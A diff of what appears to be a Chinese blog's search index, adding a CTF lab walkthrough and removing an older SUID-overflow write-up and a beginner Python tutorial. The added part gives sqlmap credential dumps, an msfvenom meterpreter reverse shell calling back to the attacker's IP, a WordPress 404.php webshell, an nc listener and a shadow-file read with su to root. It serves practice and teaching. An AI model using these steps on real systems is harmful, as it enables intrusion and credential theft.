+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
 
-<p>攻击机netcat命令监听相关端口（未占用）</p>
-<p><code>nc -lvp 端口</code></p>
-<p>查看占用端口 <code>netstat -pantu</code></p>
-<hr>
-<h3 id="利用自带文件产生溢出调用bash"><a href="#利用自带文件产生溢出调用bash" class="headerlink" title="利用自带文件产生溢出调用bash"></a>利用自带文件产生溢出调用bash</h3><p>登陆后发现不是root权限，于是查看根目录</p>
-<p><code>cd /root</code>  <code>ls</code></p>
-<p>可能会发现flag.txt，但是可能没有权限直接打开</p>
-<p>于是查找具有root权限的文件</p>
-<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
-<p>发现read_message名字与根目录类似</p>
-<p><code>cat read_message.c</code></p>
-<p>可能会找到flag2</p>
-<p>代码审计下面的c语言</p>
-<p>发现调用这个message这个文件并输出相关信息</p>
-<p>打开read_message</p>
-<p><code>read_message</code></p>
-<p>然后我们输入SimonAAA</p>
-<p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
-<hr>
-<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
-<p>然后就可以成功打开flag.txt文件</p>
-<hr>
-<h2 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h2><ol>
-<li>查看当前用户<code>whoami</code></li>
-<li>查看当前用户的权限<code>id</code></li>
-<li>查看所有用户的列表 <code>cat/etc/passwd</code></li>
-<li>查看用户组 <code>cat /etc/group</code></li>
-<li>查看属于某些用户的文件<code>find / -user 用户名</code></li>
-<li>查看缓冲文件目录 <code>/tmp</code></li>
-</ol>
+<p>查找到对应的用户名和密码，登录系统</p>
+<p>上传shell反弹权限</p>
+<p>生成反弹shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
+
+<p>将生成的shell保存到php文件中</p>
+<p>监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后上传webshell，实现反弹，获取flag</p>
+<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
+<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
+<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>得到用户名和密码</p>
+<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
+<p><code>/wordpress/wp-login.php</code></p>
+<p>输入用户名和密码，登陆后台。</p>
+<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
+<p>利用自带的反弹shell</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
+
+<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
+<p>启动监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问上传webshell的地址(上传到404页面)</p>
+<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
+<p>成功反弹</p>
+<p>然后优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>利用su提权</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
+
+<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
+<p>提权成功</p>
+<p>然后到&#x2F;root目录获取flag</p>
+<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
+<p>扫描出X-Forwarded-For sql注入</p>
+<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>成功获取用户名和密码，登录到后台</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -910,335 +1467,7 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>ssh</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python从入门到精通——1 . Python介绍及语法元素基础知识（快速上手）</title>
-    <url>/2024/09/23/356fe7073bf3/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>“人生苦短，快用Python”</strong></em></p>
-<p>本文是python语法的一套教程，主要目的是为了之后的AI学习，能够看懂代码，并且能够自己修改参数和优化算法。</p>
-<p>看完本文能够让你对Python语法有一定了解，如果你是零基础的新手，能够让你入门python，但是本文可能不适合<strong>老油条</strong>进行学习。本套教程是一系列Python的基础语法以及一些基本算法的了解和动手联系。本套Python教程会持续较长一段时间的更新。<strong>请持续关注！！！</strong></p>
-<p>本套教材主要是通过conda虚拟环境和Jupyter Notebook进行配套学习，也可以使用PyCharm进行学习，Jupyter适合多段任务。</p>
-<h1 id="Python介绍"><a href="#Python介绍" class="headerlink" title="Python介绍"></a>Python介绍</h1><p>Python的设计哲学是“优雅”、“明确”、“简单”。在设计Python语言时，如果面临多种选择，Python开发者一般会拒绝花俏的语法，而选择明确的没有或者很少有歧义的语法。由于这种设计观念的差异，Python源代码通常被认为具备更好的可读性，并且能够支撑大规模的软件开发。这些准则被称为Python格言。在Python解释器内运行import this可以获得完整的列表。</p>
-<p>“<em><strong>对于一个特定的问题，只要有一种最好的方法来解决</strong></em>”<br>这在由Tim Peters写的Python格言（称为The Zen of Python）里面表述为：There should be one-and preferably only one-obvious way to do it。</p>
-<p>Python是一门相较于其他语言比较好入门的语言，并且也是当前人工智能相关领域的主流语言。Python是一门面向<a class="link"   href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink" >对象编程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的语言，Python在各个编程语言中比较适合新手学习，Python解释器易于扩展，可以使用C、C++或其他可以通过C调用的语言扩展新的功能和数据类型。 Python也可用于可定制化软件中的扩展程序语言。Python丰富的标准库，提供了适用于各个主要系统平台的源码或机器码。 </p>
-<p>Python秉承着开源精神，一个显著的特征就是有很多包、库可以进行导入并且调用，也可以导入自己写的程序包进行调用，出名的包不仅能让代码更加规范，也让进行一些训练任务更加简洁方便。</p>
-<p><em><strong>参考资料：</strong></em></p>
-<ol>
-<li><em><strong>《Python编程：从入门到实践》</strong></em>（通俗易懂，<a class="link"   href="https://pan.baidu.com/s/1yY8UwQzv3m5wHHX81mwbBQ?pwd=c8m7" >电子书下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</li>
-<li>***<a class="link"   href="https://github.com/jackfrued/Python-100-Days" >Python - 100天从新手到大师 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>***（github上的王中王）</li>
-<li><a href="%5Bhttps://docs.python.org/zh-cn/3/%5D(https://docs.python.org/zh-cn/3/)">Python官方文档</a>（适合入门和精进）</li>
-</ol>
-<hr>
-<p>本节的核心：如何输出<code>Hello World！</code></p>
-<p><strong>准备好了，我们正式开始教程</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>（<span class="string">&quot;Hello World！&quot;</span>）</span><br></pre></td></tr></table></figure></div>
-
-<hr>
-<h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1.  变量"></a>1.  变量</h2><h3 id="1-1-变量的介绍"><a href="#1-1-变量的介绍" class="headerlink" title="1.1 变量的介绍"></a>1.1 变量的介绍</h3><p>首先我们先看看变量的好处<br>比如我们要记录一个值：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">888</span></span><br></pre></td></tr></table></figure></div>
-<p>我们要将一个整数<code>888</code>进行运算，但是如果每次都使用<code>888</code>，那么会降低代码的复用性，而我们用一个变量来保存这个数字，那么就可以重复利用，也可以方便改变变量的值来进行计算。这样就可以让代码之间进行联系。<br>当然变量可以保存各种类型的数据，包括字符串和浮点数（可以先理解为小数，后面会详细解释）等。</p>
-<h3 id="1-2-变量的规则"><a href="#1-2-变量的规则" class="headerlink" title="1.2 变量的规则"></a>1.2 变量的规则</h3><p>但是变量的命名是有一定规则的，我们先列出所有规则，然后一一举例：</p>
-<ul>
-<li>变量名只能包含字⺟、数字和下划线 。变量名能以字⺟或下划线打 头，但不能以数字打头。例如，可将变量命名为 message_1，但不能 将其命名为 1_message。</li>
-<li>变量名不能包含空格，但能使⽤下划线来分隔其中的单词。例如，变 量名 greeting_message 可⾏，但变量名 greeting message 会 引发错误。 </li>
-<li>不要将 Python 关键字和函数名⽤作变量名。例如，不要将 print ⽤作 变量名，因为它被 Python 留作特殊⽤途（请参⻅附录 A.4）。 </li>
-<li>变量名应既简短⼜具有描述性。例如，name ⽐ n 好， student_name ⽐ s_n 好，name_length ⽐ length_of_persons_name 好。 </li>
-<li>慎⽤⼩写字⺟ l 和⼤写字⺟ O，因为它们可能被⼈错看成数字 1 和 0。<br>ps：在Python3中，变量名甚至可以用中文，但是不推荐这样做，应该创建通俗易懂的变量名，比如利用英文翻译你的中文来作为变量名。<blockquote>
-<p>以上参考《Python编程：从入门到实践》</p>
-</blockquote>
-</li>
-</ul>
-<p>变量可以理解为一个数据或内容的标签，你可以通过标签找到存在里面的内容，并且你可以修改内容的标签，以便人类来进行理解。</p>
-<p>下面举两个例子</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;I Love Python&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241424893.png"
-                      alt="image.png"
-                ></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line">b = <span class="number">321</span></span><br><span class="line">c = <span class="number">7</span></span><br><span class="line">d = <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line">c = <span class="number">77</span></span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line"><span class="built_in">print</span>(b-d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c/<span class="number">7</span>)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241425084.png"
-                      alt="image.png"
-                ></p>
-<h2 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2. 字符串"></a>2. 字符串</h2><h3 id="2-1-字符串的介绍"><a href="#2-1-字符串的介绍" class="headerlink" title="2.1 字符串的介绍"></a>2.1 字符串的介绍</h3><p><strong>字符串</strong>是一系列用单引号或者双引号引起来的字符组成的，但是个人建议字符串用双引号，单个字符用单引号。比如<code>&#39;h&#39;</code>和<code>&quot;hello&quot;</code>.<br>我们来看一下字符串的输出方式，首先字符串可以利用变量储存起来：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">&quot;Python&quot;</span></span><br><span class="line"></span><br><span class="line">str3 = <span class="string">&quot;World&quot;</span></span><br><span class="line"></span><br><span class="line">num1 = <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1,str2,str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1 + <span class="string">&quot; &quot;</span> + str2 + <span class="string">&quot; &quot;</span> + str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1+<span class="string">&quot;666&quot;</span>+str2+<span class="string">&quot;777&quot;</span>+str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1 + str2 + str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1+str2+str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;str2&#125;</span><span class="subst">&#123;num1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;str2.upper()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241514265.png"
-                      alt="image.png"
-                ></p>
-<h3 id="2-2-关于字符串的函数"><a href="#2-2-关于字符串的函数" class="headerlink" title="2.2 关于字符串的函数"></a>2.2 关于字符串的函数</h3><p>以下提前介绍几个关于字符串的函数，这里只是提前了解，具体函数的讲解在之后的文章。<br>（1）<code>title()</code>函数<br>这个函数就是让字符串的每个单词首字母大写。<br><em>举例如下：</em></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;hello python&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.title())</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241533807.png"
-                      alt="image.png"
-                ><br>（2）<code>upper()</code>和<code>lower()</code>函数<br>这两个函数是相反的作用，upper()是让所有字母大写，lower()是让所有字母小写<br><em>举例如下：</em></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1.upper())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str2.lower())</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241535864.png"
-                      alt="image.png"
-                ></p>
-<h3 id="2-3-字符串的输出"><a href="#2-3-字符串的输出" class="headerlink" title="2.3 字符串的输出"></a>2.3 字符串的输出</h3><p>可以看到如上几种输出方式，一般字符串变量之间利用<code>,</code>连接，然后之间也可以自己穿插字符串，如果利用<code>+</code>连接，那么字符串之间是没有空格的，需要自己加上<code>&quot; &quot;</code>作为空格。<code>f&quot;&quot;</code>为Python的标准化输出，如果要引用变量需要用<code>&#123;&#125;</code>大括号括起来，表示里面是变量名，<code>&#123;&#125;</code>里面还可以将数字来进行计算然后作为输出</p>
-<p><em><strong>ps： 这里的反斜杠<code>&quot;\&quot;</code>是转义字符，加上后面跟着的符号会转义为一个操作，或者在标准化输出中，会直接进行输出，否则会报错。比如想输出一个双引号<code>&quot;</code>，但是由于输出字符外面也是用的双引号，当你这样运行时系统会报错：你的双引号没有闭上，就是只有前引号而没有后引号，所以需要加上转义字符，代表你想单独输出这个符号。<br>具体的例子可以自己在编辑器试一下，这里不详细给出</strong></em><br><strong>下面是转义字符的表格</strong></p>
-<table>
-<thead>
-<tr>
-<th>转义字符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>\(在行尾时)</td>
-<td>续行符</td>
-</tr>
-<tr>
-<td>\</td>
-<td>反斜杠符号</td>
-</tr>
-<tr>
-<td>\&#96;</td>
-<td>单引号</td>
-</tr>
-<tr>
-<td>\“</td>
-<td>双引号</td>
-</tr>
-<tr>
-<td>\a</td>
-<td>响铃</td>
-</tr>
-<tr>
-<td>\b</td>
-<td>退格(Backspace)</td>
-</tr>
-<tr>
-<td>\e</td>
-<td>转义</td>
-</tr>
-<tr>
-<td>\000</td>
-<td>空</td>
-</tr>
-<tr>
-<td>\n</td>
-<td>换行</td>
-</tr>
-<tr>
-<td>\v</td>
-<td>纵向制表符</td>
-</tr>
-<tr>
-<td>\t</td>
-<td>横向制表符</td>
-</tr>
-<tr>
-<td>\r</td>
-<td>回车</td>
-</tr>
-<tr>
-<td>\f</td>
-<td>换页</td>
-</tr>
-<tr>
-<td>\oyy</td>
-<td>八进制数，y 代表 0~7 的字符，例如：\012 代表换行</td>
-</tr>
-<tr>
-<td>\xyy</td>
-<td>十六进制数，以 \x 开头，yy代表的字符，例如：\x0a代表换行</td>
-</tr>
-<tr>
-<td>\other</td>
-<td>其它的字符以普通格式输出</td>
-</tr>
-</tbody></table>
-<p>我们可以利用制表符<code>&quot;\t&quot;</code>和换行符符<code>&quot;\n&quot;</code>来制造空白（制表可用）和换行<br>比如：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello\nPython&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello\tPython&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241519734.png"
-                      alt="image.png"
-                ></p>
-<h3 id="2-3-字符串的练习"><a href="#2-3-字符串的练习" class="headerlink" title="2.3 字符串的练习"></a>2.3 字符串的练习</h3><p>以下题目可以进行练习，后面会给出答案：</p>
-<blockquote>
-<p>题目来源：《Python编程：从入门到实践》</p>
-</blockquote>
-<p>练习1.1. <strong>个性化消息</strong>  ⽤变量表⽰⼀个⼈的名字，并向其显⽰⼀条消息。显⽰的消息应⾮常简单，如下所⽰。<br><em>Hello Eric, would you like to learn some Python today?</em></p>
-<p>练习1.2. <strong>调整名字的⼤⼩写</strong>  ⽤变量表⽰⼀个⼈的名字，再分别以全⼩写、全⼤写和⾸字⺟⼤写的⽅式显⽰这个⼈名。</p>
-<p>练习1.3. <strong>名⾔ 1</strong> 找到你钦佩的名⼈说的⼀句名⾔，将这个名⼈的姓名和名⾔打印出来。输出应类似于下⾯这样（包括引号）。<br><em>Albert Einstein once said, “A person who never made a mistake never tried anything new.”</em></p>
-<p>练习1.4. <strong>名⾔ 2</strong>  重复练习 1.3，但⽤变量 famous_person 表⽰名⼈的姓名，再创建要显⽰的消息并将其赋给变量 message，然后打印这条消息。</p>
-<p><em><strong>答案如下：</strong></em><br>练习1.1</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>, would you like to learn some Python today?&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<p>练习1.2</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure></div>
-
-<p>练习1.3</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Albert Einstein once said, A person who never made a mistake never tried anything new&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<p>练习1.4</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Albert Einstein&quot;</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;A person who never made a mistake never tried anything new.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> once said, \&quot;<span class="subst">&#123;message&#125;</span>\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="3-数"><a href="#3-数" class="headerlink" title="3. 数"></a>3. 数</h2><h3 id="3-0-运算符"><a href="#3-0-运算符" class="headerlink" title="3.0 运算符"></a>3.0 运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>[]</code> <code>[:]</code></td>
-<td>下标，切片</td>
-</tr>
-<tr>
-<td><code>**</code></td>
-<td>指数</td>
-</tr>
-<tr>
-<td><code>~</code> <code>+</code> <code>-</code></td>
-<td>按位取反, 正负号</td>
-</tr>
-<tr>
-<td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td>
-<td>乘，除，模，整除</td>
-</tr>
-<tr>
-<td><code>+</code> <code>-</code></td>
-<td>加，减</td>
-</tr>
-<tr>
-<td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td>
-<td>右移，左移</td>
-</tr>
-<tr>
-<td><code>&amp;</code></td>
-<td>按位与</td>
-</tr>
-<tr>
-<td><code>^</code> <code>|</code></td>
-<td>按位异或，按位或&#96;</td>
-</tr>
-<tr>
-<td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td>
-<td>小于等于，小于，大于，大于等于</td>
-</tr>
-<tr>
-<td><code>==</code> <code>!=</code></td>
-<td>等于，不等于</td>
-</tr>
-<tr>
-<td><code>is</code> <code>is not</code></td>
-<td>身份运算符</td>
-</tr>
-<tr>
-<td><code>in</code> <code>not in</code></td>
-<td>成员运算符</td>
-</tr>
-<tr>
-<td><code>not</code> <code>or</code> <code>and</code></td>
-<td>逻辑运算符</td>
-</tr>
-<tr>
-<td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td>
-<td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>ps：实际开发中，一般用括号来确定运算优先级</p>
-</blockquote>
-<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>赋值运算符时最常见的运算符，无论是前面的变量赋值还是后面的运算赋值，都是必不可少的运算符。<br>赋值运算符中有一类叫复合赋值运算符，可以理解为在赋值前进行一次运算</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">a += b        <span class="comment"># 相当于：a = a + b</span></span><br><span class="line">a *= a + <span class="number">2</span>    <span class="comment"># 相当于：a = a * (a + 2)</span></span><br><span class="line"><span class="built_in">print</span>(a)      <span class="comment"># 算一下这里会输出什么</span></span><br></pre></td></tr></table></figure></div>
-
